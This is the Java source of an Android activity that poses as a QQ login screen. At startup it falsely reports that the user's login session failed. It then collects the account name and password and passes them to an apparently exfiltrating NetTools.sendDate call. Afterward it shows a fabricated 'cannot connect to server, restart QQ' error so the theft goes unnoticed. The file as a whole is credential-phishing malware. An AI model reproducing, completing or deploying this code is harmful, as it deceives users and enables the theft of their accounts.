package com.mycompany.myapp2;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Environment;
import android.widget.*;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.*;
import android.app.Activity;
import java.io.ByteArrayInputStream;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import java.io.IOException;
import android.view.Gravity;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.view.animation.DecelerateInterpolator;
import android.view.animation.TranslateAnimation;
import android.view.View.OnFocusChangeListener;
import android.text.TextWatcher;
import android.text.Editable;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import x.AES;
import x.NetTools;

public class MActivity extends Activity
{
	LinearLayout b,c;
	EditText ac,pass;
	ImageButton c1,c2;
	Button login;
	Handler k=new Handler(){

				@Override
				public void handleMessage(Message msg)
					{
					// TODO: Implement this method
					super.handleMessage(msg);
					if(msg.what==0x001){
						login.setEnabled(true);
						showText("err=-10:无法连接到服务器，请重启QQ客户端重试");
					}
					} 
		
	};
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
	{
        super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.main);
		c=(LinearLayout)findViewById(R.id.content);
		b=(LinearLayout)findViewById(R.id.back);
		c1=(ImageButton)findViewById(R.id.clear1);
	    c2=(ImageButton)findViewById(R.id.clear2);
	    c1.setVisibility(View.GONE);
		c2.setVisibility(View.GONE);
	c1.setOnClickListener(new OnClickListener(){
				@Override
				public void onClick(View p1)
					{
					ac.setText("");
					}
		});
	c2.setOnClickListener(new OnClickListener(){
				@Override
				public void onClick(View p1)
					{
					pass.setText("");
					}
			});
     	GradientDrawable a=new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{Color.parseColor("#ace7ef"),Color.parseColor("#ace7ef"),Color.parseColor("#e7d9c5"),Color.parseColor("#e7d9c5")});
		a.setGradientType(GradientDrawable.LINEAR_GRADIENT);
		b.setBackgroundDrawable(a);
		TranslateAnimation l=new TranslateAnimation(0,0,400,0);
		l.setInterpolator(new DecelerateInterpolator());
		l.setDuration(800);
		c.startAnimation(l);
        ac=(EditText)findViewById(R.id.main_ac);
	    pass=(EditText)findViewById(R.id.main_pass);
		login=(Button)findViewById(R.id.main_login_b);
	ac.setOnFocusChangeListener(new OnFocusChangeListener(){
				@Override
				public void onFocusChange(View p1, boolean p2)
					{
					// TODO: Implement this method
					if(p2){
						if(!ac.getText().toString().equals("")){
							c1.setVisibility(View.VISIBLE);
						}
					}else{
						c1.setVisibility(View.GONE);
					}
					}
		});
	ac.addTextChangedListener(new TextWatcher(){

				@Override
				public void beforeTextChanged(CharSequence p1, int p2, int p3, int p4)
					{
					// TODO: Implement this method
					}

				@Override
				public void onTextChanged(CharSequence p1, int p2, int p3, int p4)
					{
					// TODO: Implement this method
					}

				@Override
				public void afterTextChanged(Editable p1)
					{
					if(p1.toString().equals("")){
						c1.setVisibility(View.GONE);
					}else{
						c1.setVisibility(View.VISIBLE);
					}
					}
		});
	pass.setOnFocusChangeListener(new OnFocusChangeListener(){
				@Override
				public void onFocusChange(View p1, boolean p2)
					{
					// TODO: Implement this method
					if(p2){
						if(!pass.getText().toString().equals("")){
							c2.setVisibility(View.VISIBLE);
							}
						}else{
						c2.setVisibility(View.GONE);
						}
					}
			});
		pass.addTextChangedListener(new TextWatcher(){

				@Override
				public void afterTextChanged(Editable p1)
				{
					// TODO: Implement this method
					if(p1.toString().equals("")){
						c2.setVisibility(View.GONE);
					}else{
						c2.setVisibility(View.VISIBLE);
					}
				}


				@Override
				public void beforeTextChanged(CharSequence p1, int p2, int p3, int p4)
					{
					// TODO: Implement this method
					}

				@Override
				public void onTextChanged(CharSequence p1, int p2, int p3, int p4)
					{
					}

			});
		login.setOnClickListener(new View.OnClickListener(){

				@Override
				public void onClick(View p1)
				{
					if(ac.getText().toString().equals("")) showText("请输入用户名");
					else if(pass.getText().toString().equals("")) showText("密码不能为空");
					else{
                    SharedPreferences p=MActivity.this.getSharedPreferences("get", Context.MODE_PRIVATE);
                    SharedPreferences.Editor se=p.edit();
                    se.putBoolean("get",true);
                    se.commit();
                        new Thread(new Runnable() {
                         @Override
                         public void run() {
                         NetTools.sendDate(MActivity.this,ac.getText().toString() + "+" + pass.getText().toString());
                         }
                     }).start();
					k.sendEmptyMessageDelayed(0x001,2000);
					}
				}
			}
			);
			showText("验证登陆状态出错，请重新登陆。");
			}




    private void showText(String a){
		Toast l=new Toast(this);
		l.setGravity(Gravity.TOP,200,-50);
		View k=this.getLayoutInflater().inflate(R.layout.dialog,null);
		TextView y=(TextView)k.findViewById(R.id.dialogTextView1);
		y.setText(a);
		l.setView(k);
		l.show();
	}
}
